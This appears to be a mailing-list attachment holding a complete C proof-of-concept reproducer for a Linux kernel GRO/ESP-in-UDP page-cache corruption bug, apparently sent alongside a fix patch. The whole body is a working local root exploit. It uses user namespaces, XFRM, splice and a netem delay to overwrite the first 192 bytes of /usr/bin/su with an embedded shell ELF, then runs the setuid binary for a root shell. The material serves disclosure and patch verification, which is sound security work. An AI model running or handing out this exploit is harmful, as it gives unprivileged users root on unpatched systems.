+#ifndef NETLINK_XFRM
+#define NETLINK_XFRM 6
+#endif
+#ifndef IFLA_IFNAME
+#define IFLA_IFNAME 3
+#endif
+#ifndef IFLA_LINKINFO
+#define IFLA_LINKINFO 18
+#endif
+#ifndef IFLA_INFO_KIND
+#define IFLA_INFO_KIND 1
+#endif
+#ifndef IFLA_INFO_DATA
+#define IFLA_INFO_DATA 2
+#endif
+#ifndef VETH_INFO_PEER
+#define VETH_INFO_PEER 1
+#endif
+#ifndef IFLA_NET_NS_PID
+#define IFLA_NET_NS_PID 19
+#endif
+#ifndef IFA_LOCAL
+#define IFA_LOCAL 2
+#endif
+#ifndef IFA_ADDRESS
+#define IFA_ADDRESS 1
+#endif
+#ifndef NLA_F_NESTED
+#define NLA_F_NESTED (1 << 15)
+#endif
+#ifndef ETHTOOL_SGRO
+#define ETHTOOL_SGRO 0x0000002c
+#endif
+#ifndef ETHTOOL_STSO
+#define ETHTOOL_STSO 0x0000001f
+#endif
+#ifndef ETHTOOL_SGSO
+#define ETHTOOL_SGSO 0x00000024
+#endif
+#ifndef SIOCETHTOOL
+#define SIOCETHTOOL 0x8946
+#endif
+#ifndef UDP_ENCAP
+#define UDP_ENCAP 100
+#endif
+#ifndef UDP_ENCAP_ESPINUDP
+#define UDP_ENCAP_ESPINUDP 2
+#endif
+#ifndef UDP_GRO
+#define UDP_GRO 104
+#endif
+#ifndef UDP_CORK
+#define UDP_CORK 1
+#endif
+#ifndef AF_ALG
+#define AF_ALG 38
+#endif
+#ifndef SOL_ALG
+#define SOL_ALG 279
+#endif
+#ifndef ALG_SET_KEY
+#define ALG_SET_KEY 1
+#endif
+#ifndef ALG_SET_OP
+#define ALG_SET_OP 3
+#endif
+#ifndef ALG_OP_ENCRYPT
+#define ALG_OP_ENCRYPT 1
+#endif
+#ifndef IFLA_XDP
+#define IFLA_XDP 43
+#endif
+#ifndef IFLA_XDP_FD
+#define IFLA_XDP_FD 1
+#endif
+#ifndef IFLA_XDP_FLAGS
+#define IFLA_XDP_FLAGS 3
+#endif
+#ifndef XDP_FLAGS_SKB_MODE
+#define XDP_FLAGS_SKB_MODE (1U << 1)
+#endif
+
+struct rtnl_ifinfomsg {
+	unsigned char  ifi_family;
+	unsigned char  __ifi_pad;
+	unsigned short ifi_type;
+	int            ifi_index;
+	unsigned int   ifi_flags;
+	unsigned int   ifi_change;
+};
+
+/* ---- constants ---- */
+
+#define VETH0       "veth0"
+#define VETH1       "veth1"
+#define ADDR_SRC    "10.0.0.1"
+#define ADDR_DST    "10.0.0.2"
+#define UDP_PORT    4500
+#define ESP_SPI     0x100
+#define ICV_LEN     16
+#define PAYLOAD_LEN 192
+/*
+ * Splice exactly 17 bytes per round: rfc4106 shifts the 8-byte IV into
+ * the AAD, so the inner GCM sees SPLICE_LEN bytes of ciphertext. With
+ * SPLICE_LEN - ICV_LEN = 1, exactly one frag byte is decrypted.
+ */
+#define SPLICE_LEN  (1 + ICV_LEN)
+
+static const unsigned char xfrm_key[20] = {
+	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
+	0x01, 0x02, 0x03, 0x04
+};
+
+static const uint8_t shell_elf[PAYLOAD_LEN] = {
+	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
+	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
+	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
+	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
+	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
+	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+};
+
+static const char *target_file = "/usr/bin/su";
+
+/* ---- utility ---- */
+
+static void die(const char *w) { fprintf(stderr, "%s: %s\n", w, strerror(errno)); exit(2); }
+static void gate_fail(const char *w) { fprintf(stderr, "gate_closed: %s: %s\n", w, strerror(errno)); exit(4); }
+
+static void store_be32(unsigned char *p, uint32_t v)
+{
+	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
+}
+
+static void sync_write(int fd) { unsigned char b = 1; if (write(fd, &b, 1) != 1) die("sync_write"); }
+static void sync_read(int fd)  { unsigned char b; if (read(fd, &b, 1) != 1) die("sync_read"); }
+
+static unsigned char read_byte_at(int fd, off_t off)
+{
+	unsigned char b;
+	if (pread(fd, &b, 1, off) != 1) die("pread");
+	return b;
+}
+
+/* ---- netlink helpers ---- */
+
+static int nl_ack_errno(char *buf, ssize_t len)
+{
+	struct nlmsghdr *nlh;
+	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
+	     nlh = NLMSG_NEXT(nlh, len)) {
+		if (nlh->nlmsg_type == NLMSG_ERROR) {
+			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);
+			if (e->error == 0) return 0;
+			errno = -e->error;
+			return -1;
+		}
+	}
+	errno = EPROTO;
+	return -1;
+}
+
+static void add_nlattr(struct nlmsghdr *nlh, size_t max,
+		       unsigned short type, const void *data, size_t len)
+{
+	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
+	struct nlattr *nla = (struct nlattr *)((char *)nlh + off);
+	if (off + NLA_HDRLEN + len > max) { fprintf(stderr, "nlmsg overflow\n"); exit(2); }
+	nla->nla_type = type;
+	nla->nla_len = NLA_HDRLEN + len;
+	memcpy((char *)nla + NLA_HDRLEN, data, len);
+	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
+}
+
+static struct nlattr *nest_begin(struct nlmsghdr *nlh, size_t max, unsigned short type)
+{
+	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
+	struct nlattr *nla = (struct nlattr *)((char *)nlh + off);
+	if (off + NLA_HDRLEN > max) { fprintf(stderr, "nlmsg overflow\n"); exit(2); }
+	nla->nla_type = type;
+	nla->nla_len = NLA_HDRLEN;
+	nlh->nlmsg_len = off + NLA_HDRLEN;
+	return nla;
+}
+
+static void nest_end(struct nlmsghdr *nlh, struct nlattr *nla)
+{
+	nla->nla_len = (unsigned short)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)nla);
+}
+
+static void nl_talk(struct nlmsghdr *nlh, int proto, const char *label)
+{
+	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
+	char resp[4096];
+	int fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, proto);
+	if (fd < 0) gate_fail(label);
+	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail(label);
+	memset(&sa, 0, sizeof(sa));
+	sa.nl_family = AF_NETLINK;
+	if (sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail(label);
+	ssize_t r = recv(fd, resp, sizeof(resp), 0);
+	if (r < 0 || nl_ack_errno(resp, r) < 0) gate_fail(label);
+	close(fd);
+}
+
+/* ---- network setup ---- */
+
+static void if_up(const char *name)
+{
+	struct ifreq ifr = {};
+	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+	if (fd < 0) gate_fail("socket");
+	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
+	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) gate_fail(name);
+	ifr.ifr_flags |= IFF_UP;
+	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) gate_fail(name);
+	close(fd);
+}
+
+static void create_veth(void)
+{
+	char buf[4096] = {};
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
+	nlh->nlmsg_type = RTM_NEWLINK;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
+	add_nlattr(nlh, sizeof(buf), IFLA_IFNAME, VETH0, strlen(VETH0) + 1);
+	struct nlattr *li = nest_begin(nlh, sizeof(buf), IFLA_LINKINFO | NLA_F_NESTED);
+	add_nlattr(nlh, sizeof(buf), IFLA_INFO_KIND, "veth", 5);
+	struct nlattr *id = nest_begin(nlh, sizeof(buf), IFLA_INFO_DATA | NLA_F_NESTED);
+	struct nlattr *pn = nest_begin(nlh, sizeof(buf), VETH_INFO_PEER | NLA_F_NESTED);
+	{ size_t o = NLMSG_ALIGN(nlh->nlmsg_len);
+	  memset((char *)nlh + o, 0, sizeof(struct rtnl_ifinfomsg));
+	  nlh->nlmsg_len = o + sizeof(struct rtnl_ifinfomsg); }
+	add_nlattr(nlh, sizeof(buf), IFLA_IFNAME, VETH1, strlen(VETH1) + 1);
+	nest_end(nlh, pn); nest_end(nlh, id); nest_end(nlh, li);
+	nl_talk(nlh, NETLINK_ROUTE, "create veth");
+}
+
+static void move_to_netns(const char *name, pid_t pid)
+{
+	char buf[4096] = {};
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	uint32_t ns_pid = (uint32_t)pid;
+	unsigned int idx = if_nametoindex(name);
+	if (!idx) gate_fail("if_nametoindex");
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
+	nlh->nlmsg_type = RTM_NEWLINK;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
+	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_index = (int)idx;
+	add_nlattr(nlh, sizeof(buf), IFLA_NET_NS_PID, &ns_pid, sizeof(ns_pid));
+	nl_talk(nlh, NETLINK_ROUTE, "move veth");
+}
+
+static void add_addr(const char *name, const char *addr)
+{
+	char buf[4096] = {};
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	struct in_addr a;
+	unsigned int idx = if_nametoindex(name);
+	if (!idx) gate_fail("if_nametoindex");
+	inet_pton(AF_INET, addr, &a);
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct ifaddrmsg));
+	nlh->nlmsg_type = RTM_NEWADDR;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
+	struct ifaddrmsg *ifa = (struct ifaddrmsg *)NLMSG_DATA(nlh);
+	ifa->ifa_family = AF_INET;
+	ifa->ifa_prefixlen = 24;
+	ifa->ifa_index = idx;
+	add_nlattr(nlh, sizeof(buf), IFA_LOCAL, &a, sizeof(a));
+	add_nlattr(nlh, sizeof(buf), IFA_ADDRESS, &a, sizeof(a));
+	nl_talk(nlh, NETLINK_ROUTE, "add addr");
+}
+
+static void ethtool_set(const char *name, uint32_t cmd, uint32_t data)
+{
+	struct ifreq ifr = {};
+	struct { uint32_t cmd; uint32_t data; } val = { cmd, data };
+	int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+	if (fd < 0) return;
+	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
+	ifr.ifr_data = (void *)&val;
+	ioctl(fd, SIOCETHTOOL, &ifr);
+	close(fd);
+}
+
+/* ---- XDP attach/detach for NAPI init ---- */
+
+static void xdp_toggle(const char *name, int prog_fd, uint32_t flags)
+{
+	char buf[4096] = {};
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	unsigned int idx = if_nametoindex(name);
+	if (!idx) return;
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtnl_ifinfomsg));
+	nlh->nlmsg_type = RTM_NEWLINK;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_family = AF_UNSPEC;
+	((struct rtnl_ifinfomsg *)NLMSG_DATA(nlh))->ifi_index = (int)idx;
+	struct nlattr *x = nest_begin(nlh, sizeof(buf), IFLA_XDP | NLA_F_NESTED);
+	add_nlattr(nlh, sizeof(buf), IFLA_XDP_FD, &prog_fd, sizeof(prog_fd));
+	add_nlattr(nlh, sizeof(buf), IFLA_XDP_FLAGS, &flags, sizeof(flags));
+	nest_end(nlh, x);
+	nl_talk(nlh, NETLINK_ROUTE, "xdp");
+}
+
+static void enable_veth_napi(const char *name)
+{
+	struct bpf_insn { uint8_t code; uint8_t regs; int16_t off; int32_t imm; };
+	struct bpf_insn prog[] = { { 0xb7, 0, 0, 2 }, { 0x95, 0, 0, 0 } };
+	struct { uint32_t t; uint32_t c; uint64_t i; uint64_t l;
+		 uint32_t a,b; uint64_t d; uint32_t e,f; char n[16]; } attr = {};
+	static const char lic[] = "GPL";
+	attr.t = 6; attr.c = 2;
+	attr.i = (uint64_t)(unsigned long)prog;
+	attr.l = (uint64_t)(unsigned long)lic;
+	int fd = (int)syscall(__NR_bpf, 5, &attr, sizeof(attr));
+	if (fd < 0) return;
+	xdp_toggle(name, fd, XDP_FLAGS_SKB_MODE);
+	close(fd);
+	int m1 = -1;
+	xdp_toggle(name, m1, XDP_FLAGS_SKB_MODE);
+}
+
+/* ---- user namespace ---- */
+
+static void setup_userns(void)
+{
+	uid_t uid = getuid();
+	gid_t gid = getgid();
+	int rp[2], mp[2];
+	if (pipe(rp) < 0 || pipe(mp) < 0) die("pipe");
+	pid_t c = fork();
+	if (c < 0) die("fork");
+	if (c == 0) {
+		char path[64], map[64]; pid_t pp = getppid();
+		close(rp[1]); close(mp[0]); sync_read(rp[0]);
+		snprintf(path, sizeof(path), "/proc/%d/setgroups", pp);
+		int fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, "deny", 4); close(fd); }
+		snprintf(path, sizeof(path), "/proc/%d/uid_map", pp);
+		snprintf(map, sizeof(map), "0 %u 1\n", uid);
+		fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
+		snprintf(path, sizeof(path), "/proc/%d/gid_map", pp);
+		snprintf(map, sizeof(map), "0 %u 1\n", gid);
+		fd = open(path, O_WRONLY); if (fd >= 0) { write(fd, map, strlen(map)); close(fd); }
+		sync_write(mp[1]); _exit(0);
+	}
+	close(rp[0]); close(mp[1]);
+	if (unshare(CLONE_NEWUSER) < 0) gate_fail("unshare(CLONE_NEWUSER)");
+	sync_write(rp[1]); sync_read(mp[0]); waitpid(c, NULL, 0);
+	setresgid(0, 0, 0); setresuid(0, 0, 0);
+}
+
+/* ---- XFRM SA ---- */
+
+static void add_sa(void)
+{
+	char buf[4096] = {};
+	char ab[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_key)];
+	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));
+	nlh->nlmsg_type = XFRM_MSG_NEWSA;
+	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
+	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
+	xs->sel.family = AF_INET;
+	inet_pton(AF_INET, ADDR_SRC, &xs->saddr.a4);
+	inet_pton(AF_INET, ADDR_DST, &xs->id.daddr.a4);
+	xs->id.spi = htonl(ESP_SPI); xs->id.proto = IPPROTO_ESP;
+	xs->family = AF_INET; xs->mode = XFRM_MODE_TRANSPORT; xs->replay_window = 0;
+	xs->lft.soft_byte_limit = xs->lft.hard_byte_limit = XFRM_INF;
+	xs->lft.soft_packet_limit = xs->lft.hard_packet_limit = XFRM_INF;
+	memset(ab, 0, sizeof(ab));
+	struct xfrm_algo_aead *a = (struct xfrm_algo_aead *)ab;
+	strcpy(a->alg_name, "rfc4106(gcm(aes))");
+	a->alg_key_len = sizeof(xfrm_key) * 8;
+	a->alg_icv_len = ICV_LEN * 8;
+	memcpy(a->alg_key, xfrm_key, sizeof(xfrm_key));
+	add_nlattr(nlh, sizeof(buf), XFRMA_ALG_AEAD, ab, sizeof(ab));
+	struct xfrm_encap_tmpl encap = {};
+	encap.encap_type = UDP_ENCAP_ESPINUDP;
+	encap.encap_sport = htons(UDP_PORT);
+	encap.encap_dport = htons(UDP_PORT);
+	add_nlattr(nlh, sizeof(buf), XFRMA_ENCAP, &encap, sizeof(encap));
+	nl_talk(nlh, NETLINK_XFRM, "add SA");
+}
+
+/* ---- AES-GCM keystream ---- */
+
+static void aes_ecb_block(int alg_fd, const unsigned char in[16], unsigned char out[16])
+{
+	char cb[CMSG_SPACE(sizeof(uint32_t))] = {};
+	struct iovec iov = { (void *)in, 16 };
+	struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_control = cb, .msg_controllen = sizeof(cb) };
+	uint32_t op = ALG_OP_ENCRYPT;
+	struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+	cm->cmsg_level = SOL_ALG; cm->cmsg_type = ALG_SET_OP;
+	cm->cmsg_len = CMSG_LEN(sizeof(op));
+	memcpy(CMSG_DATA(cm), &op, sizeof(op));
+	int ofd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
+	if (ofd < 0) die("AF_ALG accept");
+	if (sendmsg(ofd, &msg, 0) != 16) die("AF_ALG send");
+	if (read(ofd, out, 16) != 16) die("AF_ALG read");
+	close(ofd);
+}
+
+/*
+ * rfc4106 shifts the 8-byte ESP IV into the AAD, so the inner GCM
+ * ciphertext starts at frag byte 0. The target byte is at CTR position 0.
+ */
+#define KS_POS 0
+
+static uint16_t stream_nonce[256];
+static bool stream_have[256];
+
+static void build_stream_table(void)
+{
+	struct sockaddr_alg sa = { .salg_family = AF_ALG };
+	strcpy((char *)sa.salg_type, "skcipher");
+	strcpy((char *)sa.salg_name, "ecb(aes)");
+	int fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
+	if (fd < 0) die("AF_ALG");
+	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("AF_ALG bind");
+	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_key, 16) < 0) die("AF_ALG key");
+
+	unsigned int count = 0;
+	for (unsigned nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
+		unsigned char iv[8], cb[16], out[16];
+		memset(iv, 0xcc, sizeof(iv));
+		store_be32(iv + 4, nonce);
+		memcpy(cb, &xfrm_key[16], 4);
+		memcpy(cb + 4, iv, 8);
+		store_be32(cb + 12, 2 + KS_POS / 16);
+		aes_ecb_block(fd, cb, out);
+		unsigned char b = out[KS_POS % 16];
+		if (stream_have[b]) continue;
+		stream_have[b] = true;
+		stream_nonce[b] = (uint16_t)nonce;
+		count++;
+	}
+	close(fd);
+	if (count < 256) { fprintf(stderr, "incomplete stream table: %u/256\n", count); exit(2); }
+}
+
+/* ---- main ---- */
+
+int main(void)
+{
+	setvbuf(stdout, NULL, _IONBF, 0);
+
+	printf("[*] uid=%d euid=%d gid=%d egid=%d\n",
+	       getuid(), geteuid(), getgid(), getegid());
+	printf("[*] mode=gro_espinudp_pagecache_replace\n\n");
+
+	struct stat st;
+	if (stat(target_file, &st) < 0 || !S_ISREG(st.st_mode) || st.st_size < PAYLOAD_LEN + SPLICE_LEN)
+		die("stat target");
+
+	printf("[*] target=%s size=%lld\n", target_file, (long long)st.st_size);
+
+	build_stream_table();
+	printf("[*] stream_table=256 entries at ciphertext position %d\n", KS_POS);
+
+	/*
+	 * Fork before entering the user namespace. The child enters the
+	 * user/net namespace and does all the page-cache corruption. The
+	 * parent stays in the init user namespace so that execve() of the
+	 * corrupted setuid su binary honors the setuid bit, giving a real
+	 * root shell rather than a fake namespace-root shell.
+	 */
+	fflush(stdout); fflush(stderr);
+	pid_t worker = fork();
+	if (worker < 0) die("fork worker");
+	if (worker > 0) {
+		int wstatus;
+		waitpid(worker, &wstatus, 0);
+		if (WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 1) {
+			char *argv[] = { (char *)target_file, NULL };
+			char *envp[] = { NULL };
+			execve(target_file, argv, envp);
+		}
+		return WIFEXITED(wstatus) ? WEXITSTATUS(wstatus) : 2;
+	}
+
+	/* Child: enter user namespace and do the corruption */
+	if (getuid() != 0) setup_userns();
+	if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
+	if_up("lo");
+	create_veth();
+
+	int p_ns[2], p_veth[2], p_rdy[2];
+	if (pipe(p_ns) < 0 || pipe(p_veth) < 0 || pipe(p_rdy) < 0) die("pipe");
+	fflush(stdout); fflush(stderr);
+
+	pid_t rx = fork();
+	if (rx < 0) die("fork");
+
+	if (rx == 0) {
+		close(p_ns[0]); close(p_veth[1]); close(p_rdy[0]);
+		if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
+		if (unshare(CLONE_NEWNS) < 0) gate_fail("unshare(CLONE_NEWNS)");
+		mount("", "/", NULL, MS_PRIVATE | MS_REC, NULL);
+		mount("sysfs", "/sys", "sysfs", 0, NULL);
+		sync_write(p_ns[1]); close(p_ns[1]);
+		sync_read(p_veth[0]); close(p_veth[0]);
+		if_up("lo");
+		ethtool_set(VETH1, ETHTOOL_SGRO, 1);
+		if_up(VETH1);
+		enable_veth_napi(VETH1);
+		add_addr(VETH1, ADDR_DST);
+		add_sa();
+		int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+		if (ufd < 0) gate_fail("socket");
+		struct sockaddr_in ba = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
+		inet_pton(AF_INET, ADDR_DST, &ba.sin_addr);
+		if (bind(ufd, (struct sockaddr *)&ba, sizeof(ba)) < 0) gate_fail("bind");
+		int et = UDP_ENCAP_ESPINUDP, gro = 1;
+		setsockopt(ufd, IPPROTO_UDP, UDP_ENCAP, &et, sizeof(et));
+		setsockopt(ufd, IPPROTO_UDP, UDP_GRO, &gro, sizeof(gro));
+		sync_write(p_rdy[1]);
+		pause();
+		_exit(0);
+	}
+
+	close(p_ns[1]); close(p_veth[0]); close(p_rdy[1]);
+	sync_read(p_ns[0]); close(p_ns[0]);
+	move_to_netns(VETH1, rx);
+	sync_write(p_veth[1]); close(p_veth[1]);
+	if_up(VETH0); add_addr(VETH0, ADDR_SRC);
+	ethtool_set(VETH0, ETHTOOL_STSO, 0);
+	ethtool_set(VETH0, ETHTOOL_SGSO, 0);
+
+	/*
+	 * Add a netem delay on the sender veth so both datagrams sit in the
+	 * qdisc until the timer fires, then get released into veth_xmit()
+	 * within the same softirq context. This guarantees both land in one
+	 * NAPI poll cycle for GRO to merge them, without needing sysfs
+	 * gro_flush_timeout (which requires capable(CAP_NET_ADMIN) in the
+	 * init namespace). tc uses netlink with ns_capable(), so it works
+	 * from a user namespace.
+	 */
+	if (system("tc qdisc add dev " VETH0 " root netem delay 20ms") != 0)
+		gate_fail("tc netem");
+	usleep(50000);
+
+	sync_read(p_rdy[0]); close(p_rdy[0]);
+
+	int sock = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+	if (sock < 0) die("socket");
+	struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
+	struct sockaddr_in da = { .sin_family = AF_INET, .sin_port = htons(UDP_PORT) };
+	inet_pton(AF_INET, ADDR_SRC, &sa.sin_addr);
+	inet_pton(AF_INET, ADDR_DST, &da.sin_addr);
+	bind(sock, (struct sockaddr *)&sa, sizeof(sa));
+	connect(sock, (struct sockaddr *)&da, sizeof(da));
+
+	int target_fd = open(target_file, O_RDONLY | O_CLOEXEC);
+	if (target_fd < 0) die("open target");
+
+	uint32_t seq = 1;
+	size_t total_changed = 0;
+	int delay_ms = 20;
+	int sleep_us = 40000;
+	struct timespec last_ok;
+	clock_gettime(CLOCK_MONOTONIC, &last_ok);
+
+	printf("[*] replacing %d bytes starting at offset 0\n", PAYLOAD_LEN);
+
+	/* Warmup: send a dummy pair to prime the netem/NAPI path */
+	{
+		unsigned char w[16 + SPLICE_LEN];
+		memset(w, 0, sizeof(w));
+		store_be32(w, ESP_SPI);
+		store_be32(w + 4, seq++);
+		send(sock, w, sizeof(w), 0);
+		store_be32(w + 4, seq++);
+		send(sock, w, sizeof(w), 0);
+		usleep(sleep_us);
+	}
+
+	for (int pass = 0; ; pass++) {
+		size_t pass_changed = 0, remaining = 0;
+
+		for (int idx = 0; idx < PAYLOAD_LEN; idx++) {
+			unsigned char cur = read_byte_at(target_fd, idx);
+			if (cur == shell_elf[idx])
+				continue;
+			remaining++;
+
+			unsigned char need_ks = cur ^ shell_elf[idx];
+			uint16_t nonce = stream_nonce[need_ks];
+			unsigned char iv[8];
+			memset(iv, 0xcc, sizeof(iv));
+			store_be32(iv + 4, nonce);
+
+			unsigned char hdr[16];
+			char hp[] = "/tmp/fgro-XXXXXX";
+			int hfd = mkstemp(hp); unlink(hp);
+			store_be32(hdr, ESP_SPI); store_be32(hdr + 4, seq++);
+			memcpy(hdr + 8, iv, 8);
+			write(hfd, hdr, 16);
+
+			int pfd[2];
+			pipe(pfd);
+			loff_t ho = 0;
+			splice(hfd, &ho, pfd[1], NULL, 16, 0);
+			loff_t so = (loff_t)idx;
+			splice(target_fd, &so, pfd[1], NULL, SPLICE_LEN, 0);
+			close(hfd);
+
+			unsigned char p1[16 + SPLICE_LEN];
+			store_be32(p1, ESP_SPI); store_be32(p1 + 4, seq++);
+			memcpy(p1 + 8, iv, 8);
+			memset(p1 + 16, 0x41, SPLICE_LEN);
+			send(sock, p1, sizeof(p1), 0);
+
+			int cork = 1;
+			setsockopt(sock, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork));
+			splice(pfd[0], NULL, sock, NULL, 16 + SPLICE_LEN, 0);
+			cork = 0;
+			setsockopt(sock, IPPROTO_UDP, UDP_CORK, &cork, sizeof(cork));
+			close(pfd[0]); close(pfd[1]);
+
+			usleep(sleep_us);
+
+			unsigned char got = read_byte_at(target_fd, idx);
+			if (got == shell_elf[idx]) {
+				total_changed++;
+				pass_changed++;
+				clock_gettime(CLOCK_MONOTONIC, &last_ok);
+				printf("\r[+] byte %3d/%-3d  0x%02x -> 0x%02x  ok  (%zu changed)",
+				       idx, PAYLOAD_LEN, cur, got, total_changed);
+			} else {
+				printf("\r[-] byte %3d/%-3d  0x%02x -> 0x%02x (want 0x%02x) MISS",
+				       idx, PAYLOAD_LEN, cur, got, shell_elf[idx]);
+			}
+			fflush(stdout);
+		}
+
+		if (remaining == 0)
+			break;
+
+		size_t still_wrong = 0;
+		for (int idx = 0; idx < PAYLOAD_LEN; idx++)
+			if (read_byte_at(target_fd, idx) != shell_elf[idx])
+				still_wrong++;
+
+		if (still_wrong == 0)
+			break;
+
+		struct timespec now;
+		clock_gettime(CLOCK_MONOTONIC, &now);
+		long elapsed = (now.tv_sec - last_ok.tv_sec) * 1000 +
+			       (now.tv_nsec - last_ok.tv_nsec) / 1000000;
+		if (elapsed > 30000) {
+			printf("\n[!] %zu bytes stuck after 30s without progress\n",
+			       still_wrong);
+			break;
+		}
+
+		if (delay_ms < 500) {
+			delay_ms = delay_ms < 250 ? delay_ms * 2 : 500;
+			sleep_us = delay_ms * 2000;
+			char cmd[128];
+			snprintf(cmd, sizeof(cmd),
+				 "tc qdisc change dev " VETH0 " root netem delay %dms",
+				 delay_ms);
+			system(cmd);
+		}
+		printf("\n[*] pass %d: %zu ok, %zu still wrong, delay now %dms, retrying\n",
+		       pass + 1, pass_changed, still_wrong, delay_ms);
+		fflush(stdout);
+	}
+
+	close(target_fd);
+	close(sock);
+	kill(rx, SIGTERM);
+	waitpid(rx, NULL, 0);
+
+	/* Final verification: count how many bytes match shell_elf */
+	int final_fd = open(target_file, O_RDONLY | O_CLOEXEC);
+	size_t matching = 0;
+	if (final_fd >= 0) {
+		for (int i = 0; i < PAYLOAD_LEN; i++)
+			if (read_byte_at(final_fd, i) == shell_elf[i])
+				matching++;
+		close(final_fd);
+	}
+
+	printf("\n\n");
+	if (total_changed > 0) {
+		printf("VULNERABLE: %zu/%d payload bytes now match shell_elf "
+		       "(%zu written via GRO flag-strip)\n",
+		       matching, PAYLOAD_LEN, total_changed);
+		_exit(1);
+	}
+
+	printf("FIXED: 0/%d bytes changed\n", PAYLOAD_LEN);
+	_exit(0);
+}
+
+--c6LM3/lR/jigV3Rc
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment;
+	filename=0001-net-gro-propagate-SKBFL_SHARED_FRAG-in-skb_gro_recei.patch
+
